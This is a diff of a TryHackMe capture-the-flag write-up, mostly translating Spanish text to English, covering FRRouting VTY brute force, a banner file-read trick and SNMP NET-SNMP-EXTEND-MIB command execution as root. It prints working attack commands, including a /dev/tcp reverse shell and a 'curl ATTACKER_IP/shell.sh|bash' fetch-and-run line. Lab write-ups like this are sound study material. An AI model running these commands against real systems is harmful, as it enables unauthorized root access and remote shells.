@@ -1,35 +1,26 @@
-# Operation Takeover – TryHackMe Writeup
+# Operation Takeover - TryHackMe Writeup
 
-**Status:** WIP / pending final closure.
-**Target:** `TARGET_IP` (10.128.162.109 at time of solve)
-**OS:** Linux (Network appliance – FRRouting)
-**Difficulty:** Medium
-**Tech stack:** OpenSSH, FRRouting 10.0 (vty on port 2623), Net-SNMP
+**Status:** WIP / pending final closure.  
+**Target:** `TARGET_IP` (10.128.162.109 at time of solve)  
+**OS:** Linux (network appliance - FRRouting)  
+**Difficulty:** Medium  
+**Tech stack:** OpenSSH, FRRouting 10.0 VTY on port 2623, Net-SNMP
 
 ---
 
 ## Attack Chain Overview
 
-```
-nmap → 22, 179 (BGP), 2623 (FRRouting vty)
-    →
-nc :2623 → FRRouting 10.0, password prompt (Cisco-style single password)
-    →
-Hydra cisco brute-force → password: arista
-    →
-enable → arista → privileged mode
-    →
-configure terminal → banner motd file /etc/frr/frr.conf → reconnect → config leak
-    →
-mgmt load-config /root/flag.txt merge → banner motd file /etc/frr/mgmt_debug.log → flag
-    →
-[DEAD END] → pivot to UDP recon
-    →
-nmap UDP → 161/udp SNMP open
-    →
-onesixtyone brute-force → community string: pr1v4t3
-    →
-snmpset NET-SNMP-EXTEND-MIB → RCE as root → flag
+```text
+nmap -> 22, 179 (BGP), 2623 (FRRouting VTY)
+  -> nc :2623 -> FRRouting 10.0 password prompt
+  -> Hydra cisco brute force -> password: arista
+  -> enable -> arista -> privileged mode
+  -> banner motd file /etc/frr/frr.conf -> reconnect -> config leak
+  -> mgmt load-config /root/flag.txt merge -> banner leak attempt
+  -> dead end -> UDP recon
+  -> nmap UDP -> 161/udp SNMP open
+  -> onesixtyone -> community string: pr1v4t3
+  -> snmpset NET-SNMP-EXTEND-MIB -> RCE as root -> flag
 ```
 
 ---
@@ -39,7 +30,7 @@ snmpset NET-SNMP-EXTEND-MIB → RCE as root → flag
 1. [Reconnaissance](#1-reconnaissance)
 2. [FRRouting VTY Brute Force](#2-frrouting-vty-brute-force)
 3. [Privileged Mode Access](#3-privileged-mode-access)
-4. [Configuration and Flag Exfiltration (Dead End)](#4-configuration-and-flag-exfiltration-dead-end)
+4. [Configuration and Flag Exfiltration Dead End](#4-configuration-and-flag-exfiltration-dead-end)
 5. [SNMP Enumeration](#5-snmp-enumeration)
 6. [SNMP RCE via NET-SNMP-EXTEND-MIB](#6-snmp-rce-via-net-snmp-extend-mib)
 7. [Key Takeaways](#7-key-takeaways)
@@ -56,10 +47,10 @@ nmap -sVC -p22,2623 $TARGET -oN service
 nmap -O $TARGET
 ```
 
-| Port     | Service              |
-|----------|----------------------|
-| 22/tcp   | OpenSSH              |
-| 179/tcp  | tcpwrapped (BGP)     |
+| Port | Service |
+|------|---------|
+| 22/tcp | OpenSSH |
+| 179/tcp | tcpwrapped (BGP) |
 | 2623/tcp | lmdp (FRRouting VTY) |
 
 ---
@@ -88,7 +79,7 @@ Tools: [hydra](../../../tools/creds/hydra.md), [netcat](../../../tools/pivot/net
 ## 3. Privileged Mode Access
 
 ```bash
-# What it does: enter privileged (enable) mode on the FRRouting console.
+# What it does: enter privileged enable mode on the FRRouting console.
 # Why here: gain access to configuration commands and file-read primitives.
 enable
 # Password: arista
@@ -96,14 +87,13 @@ enable
 
 ---
 
-## 4. Configuration and Flag Exfiltration (Dead End)
+## 4. Configuration and Flag Exfiltration Dead End
 
-FRRouting allows exposing local files via `banner motd file`. Pointing this at sensitive
-files and reconnecting reveals the content as the MOTD banner.
+FRRouting allows local files to be exposed through `banner motd file`. Pointing the banner at a sensitive file and reconnecting shows the file content as the login MOTD.
 
 ```bash
 # What it does: set the MOTD banner to the contents of the FRR configuration file.
-# Why here: exfiltrate the running router configuration by abusing the banner-file feature.
+# Why here: exfiltrate router configuration by abusing the banner-file feature.
 configure terminal
 banner motd file /etc/frr/frr.conf
 ```
@@ -114,7 +104,7 @@ banner motd file /etc/frr/frr.conf
 nc -v $TARGET 2623
 ```
 
-No encontramos la flag por esta vía. Pivotamos a reconocimiento UDP.
+The flag was not recovered through this path, so the next pivot was UDP reconnaissance.
 
 ---
 
@@ -126,7 +116,7 @@ No encontramos la flag por esta vía. Pivotamos a reconocimiento UDP.
 nmap -sU -p 161 $TARGET
 ```
 
-```
+```text
 PORT    STATE         SERVICE
 161/udp open|filtered snmp
 ```
@@ -134,19 +124,18 @@ PORT    STATE         SERVICE
 ```bash
 # What it does: brute-force SNMP community strings using a common wordlist.
 # Why here: SNMPv1/v2c authenticates only via community strings;
-#           weak or default strings como "public", "private" o "pr1v4t3" son comunes.
+#           weak or default strings like "public", "private" and "pr1v4t3" are common.
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
 # Output: $TARGET [pr1v4t3] ...
 ```
 
 ```bash
 # What it does: walk the full MIB tree using the discovered community string.
-# Why here: enumerate all exposed OIDs to understand what information the agent leaks.
+# Why here: enumerate exposed OIDs to understand what information the agent leaks.
 snmpwalk -v2c -c pr1v4t3 $TARGET
 ```
 
-No encontramos credenciales útiles para el VTY. Sin embargo, la community string
-`pr1v4t3` (no `private`) sugiere acceso de lectura-escritura deliberado.
+No useful VTY credentials appeared in the SNMP data. The community string `pr1v4t3`, however, looked intentionally close to `private` and hinted at read-write access.
 
 ```bash
 # What it does: attempt to write a new sysName value via SNMP SET.
@@ -156,15 +145,15 @@ snmpget -v2c -c pr1v4t3 $TARGET .1.3.6.1.2.1.1.5.0
 # iso.3.6.1.2.1.1.5.0 = STRING: "Pwned"
 ```
 
-Escritura confirmada. El agente corre Net-SNMP con el módulo `NET-SNMP-EXTEND-MIB`,
-lo que permite definir comandos arbitrarios que el agente ejecuta al consultar su subárbol OID.
+Write access was confirmed. The target was running Net-SNMP with `NET-SNMP-EXTEND-MIB`, which allows arbitrary commands to be registered and executed when the extend output subtree is queried.
 
 ---
 
 ## 6. SNMP RCE via NET-SNMP-EXTEND-MIB
 
-> **Prerequisito en Kali:** los MIBs simbólicos no están instalados por defecto.
-> Sin ellos el comando falla con `Unknown Object Identifier`.
+Full technique: [snmp-extend-mib-rce.md](../../../exploits/network-services/snmp-extend-mib-rce.md).
+
+> **Kali prerequisite:** symbolic MIBs are not installed by default. Without them, `snmpset` fails with `Unknown Object Identifier`.
 >
 > ```bash
 > sudo apt install snmp-mibs-downloader -y && sudo download-mibs
@@ -186,12 +175,12 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
 # Why here: querying .1.3.6.1.4.1.8072.1.3.2 forces the agent to evaluate
 #           all registered extend entries and return their stdout.
 #
-#   1.3.6.1.4.1       → private enterprise space (IANA)
-#   8072              → NET-SNMP enterprise ID
-#   1.3.6.1.4.1.8072.1.3 → NET-SNMP extend mechanism
-#   ...2              → extend output table
+#   1.3.6.1.4.1       -> private enterprise space (IANA)
+#   8072              -> NET-SNMP enterprise ID
+#   1.3.6.1.4.1.8072.1.3 -> NET-SNMP extend mechanism
+#   ...2              -> extend output table
 snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
-# → flag.txt visible in /root
+# -> flag.txt visible in /root
 ```
 
 ```bash
@@ -204,20 +193,19 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
     'nsExtendArgs."command"'    = '-c "cat /root/flag.txt"'
 
 snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
-# → FLAG{...}
+# -> FLAG{...}
 ```
 
 ### Bonus: Reverse Shell
 
-El campo `nsExtendArgs` tiene límite de caracteres. La solución es hostear el payload
-en un servidor HTTP y fetchearlo con curl.
+The `nsExtendArgs` field has a character limit. The practical workaround is to host a payload on an HTTP server and fetch it with `curl`.
 
 ```bash
 # What it does: create and serve the reverse shell script via Python HTTP server.
 # Why here: avoids the character limit in nsExtendArgs.
 cat > shell.sh << 'EOF'
 #!/bin/bash
-/bin/bash -i >& /dev/tcp/TU_IP/4445 0>&1
+/bin/bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1
 EOF
 python3 -m http.server 80
 ```
@@ -232,7 +220,7 @@ nc -lnvp 4445
 snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c pr1v4t3 $TARGET \
     'nsExtendStatus."command"'  = createAndGo \
     'nsExtendCommand."command"' = /bin/bash \
-    'nsExtendArgs."command"'    = '-c "curl TU_IP/shell.sh|bash"'
+    'nsExtendArgs."command"'    = '-c "curl ATTACKER_IP/shell.sh|bash"'
 
 snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
 ```
@@ -241,23 +229,23 @@ snmpwalk -v2c -c pr1v4t3 $TARGET .1.3.6.1.4.1.8072.1.3.2
 
 ## 7. Key Takeaways
 
-| Lección | Detalle |
-|---------|---------|
-| Community strings de escritura = RCE | `pr1v4t3` con write access + Net-SNMP → ejecución de comandos arbitrarios como root |
-| `NET-SNMP-EXTEND-MIB` es peligroso | Cualquier agente Net-SNMP con write SNMP y este módulo habilitado es vulnerable |
-| UDP recon es obligatorio | El vector final estaba en UDP/161, invisible en un escaneo TCP puro |
-| MIBs en Kali no vienen instalados | `snmp-mibs-downloader` es necesario; sin él los nombres simbólicos no resuelven |
-| Límite de caracteres en args | Para payloads largos, usar curl para fetchear el script en lugar de inline |
+| Lesson | Detail |
+|--------|--------|
+| Write community strings can become RCE | `pr1v4t3` with write access plus Net-SNMP allowed command execution as root |
+| `NET-SNMP-EXTEND-MIB` is dangerous | Any Net-SNMP agent with writable SNMP and this module enabled is a command-execution target |
+| UDP recon is mandatory | The final vector lived on UDP/161 and was invisible to TCP-only scanning |
+| Kali MIBs are not installed by default | `snmp-mibs-downloader` is required for symbolic MIB names |
+| Long args need staging | For long payloads, fetch a script with `curl` instead of trying to inline the full reverse shell |
 
 ---
 
 ## Related Notes
 
-- [hydra](../../../tools/creds/hydra.md) — VTY brute force
-- [netcat](../../../tools/pivot/netcat.md) — VTY console connection
-- [nmap](../../../tools/recon/nmap.md) — Initial port discovery
-- [onesixtyone](../../../tools/recon/onesixtyone.md) — SNMP community string brute-forcer
-- [snmpwalk](../../../tools/recon/snmpwalk.md) — SNMP MIB tree enumeration
-- [snmpset](../../../tools/recon/snmpset.md) — SNMP writing values
-- [frrouting-vty-banner-file-read](../../../exploits/network-services/frrouting-vty-banner-file-read.md) — FRRouting banner MOTD local file read
-- [snmp-extend-mib-rce](../../../exploits/network-services/snmp-extend-mib-rce.md) — SNMP NET-SNMP-EXTEND-MIB command execution
+- [hydra](../../../tools/creds/hydra.md) - VTY brute force
+- [netcat](../../../tools/pivot/netcat.md) - VTY console connection
+- [nmap](../../../tools/recon/nmap.md) - Initial port discovery
+- [onesixtyone](../../../tools/recon/onesixtyone.md) - SNMP community string brute-forcer
+- [snmpwalk](../../../tools/recon/snmpwalk.md) - SNMP MIB tree enumeration
+- [snmpset](../../../tools/recon/snmpset.md) - SNMP value writes
+- [frrouting-vty-banner-file-read](../../../exploits/network-services/frrouting-vty-banner-file-read.md) - FRRouting banner MOTD local file read
+- [snmp-extend-mib-rce](../../../exploits/network-services/snmp-extend-mib-rce.md) - SNMP NET-SNMP-EXTEND-MIB command execution
